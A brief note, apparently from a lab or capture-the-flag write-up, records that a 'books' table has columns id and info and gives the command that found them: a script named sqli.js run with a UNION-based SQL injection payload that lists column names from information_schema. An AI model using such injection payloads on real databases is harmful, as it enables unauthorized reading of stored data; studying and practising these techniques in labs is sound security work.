# 
- column names for books table is id and info
```node sqli.js 'UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name="books"'```

